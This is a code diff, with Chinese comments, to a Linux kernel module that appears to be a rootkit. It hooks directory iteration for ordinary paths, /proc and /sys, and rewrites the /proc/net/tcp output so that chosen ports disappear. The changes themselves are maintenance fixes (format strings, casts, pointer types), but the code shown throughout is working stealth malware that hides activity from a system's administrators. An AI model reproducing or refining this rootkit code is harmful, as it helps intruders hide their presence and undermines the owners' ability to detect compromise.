@@ -285,7 +285,7 @@ void port_node_delete(long port);
 int port_node_add(long port){
     tmp_port_node = kmalloc(sizeof(struct port_node),GFP_KERNEL);
     tmp_port_node->port = port;
-    printk("add port: %l\n", port);
+    printk("add port: %ld\n", port);
     list_add_tail(&(tmp_port_node->list), &port_node_head);
     return 0;
 }
@@ -295,7 +295,7 @@ void port_node_delete(long port){
         tmp_port_node = list_entry(port_node_pos,struct port_node,list);
         if (tmp_port_node->port == port)
             {
-                printk("delete port: %l\n", port);
+                printk("delete port: %ld\n", port);
                 list_del(&(tmp_port_node->list));
                 break;
             }
@@ -645,8 +645,8 @@ asmlinkage int new_sys_filldir(struct dir_context *ctx, const char *name, int na
 //调试函数 打印每个一级目录的iterate etc: / /etc /dev /var .....
 void display_iterate(const char* path){
     struct file *f;
-    f = filp_open(path, O_RDONLY, 0);
     struct file_operations *f_op;
+    f = filp_open(path, O_RDONLY, 0);
     f_op = (struct file_operations *)f->f_op;
     printk("%s iterate is %p\n", path, f_op->iterate);
     return;
@@ -674,7 +674,7 @@ int new_seq_show(struct seq_file *seq, void *v) {
     ret = org_seq_show(seq, v); //调用原始的show函数先缓存区写一行
     list_for_each(port_node_pos, &port_node_head){
         tmp_port_node = list_entry(port_node_pos,struct port_node,list);
-        snprintf(needle, NEEDLE_LEN, ":%04X", tmp_port_node->port); //转换成/proc/net/tcp格式的port形式
+        snprintf(needle, NEEDLE_LEN, ":%04X", (unsigned int)tmp_port_node->port); //转换成/proc/net/tcp格式的port形式
         if (strnstr(seq->buf + seq->count - TMPSZ, needle, TMPSZ)) { //如果缓冲区的最新一行中包含指定的port
             seq->count -= TMPSZ; //从缓冲区删除这行
             break;
@@ -725,8 +725,9 @@ static void lkm_exit(void)
         disable_write();
     }
     if (org_common_iterate) {
-        void *dummy;
+        file_iterate dummy;
         hook_file_op(COMMON_PATH, org_common_iterate, &dummy); // 还原普通目录
+        dummy = NULL;
         list_for_each_safe(common_node_pos, tmp_common_node_pos, &common_node_head) {
             tmp_common_node = list_entry(common_node_pos,struct common_node,list);
             list_del(&(tmp_common_node->list));
@@ -734,24 +735,27 @@ static void lkm_exit(void)
         }
     }
     if (org_proc_iterate) {
-        void *dummy;
+        file_iterate dummy;
         hook_file_op(PROC_PATH, org_proc_iterate, &dummy); // 还原/proc目录
+        dummy = NULL;
         list_for_each_safe(proc_node_pos, tmp_proc_node_pos, &proc_node_head) {
             tmp_proc_node = list_entry(proc_node_pos,struct proc_node,list);
             list_del(&(tmp_proc_node->list));
         }
     }
     if (org_sys_iterate) {
-        void *dummy;
+        file_iterate dummy;
         hook_file_op(SYS_PATH, org_sys_iterate, &dummy); // 还原/sys目录
+        dummy = NULL;
         list_for_each_safe(sys_node_pos, tmp_sys_node_pos, &sys_node_head) {
             tmp_sys_node = list_entry(sys_node_pos,struct sys_node,list);
             list_del(&(tmp_sys_node->list));
         }
     }
     if (org_seq_show) {
-        void *dummy;
+        seq_file_show dummy;
         hook_afinfo_seq_op(TCP_IPV4_PATH, org_seq_show, &dummy); // 还原 tcp ipv4的show
+        dummy = NULL;
         list_for_each_safe(port_node_pos, tmp_port_node_pos, &port_node_head) {
             tmp_port_node = list_entry(port_node_pos,struct port_node,list);
             list_del(&(tmp_port_node->list));
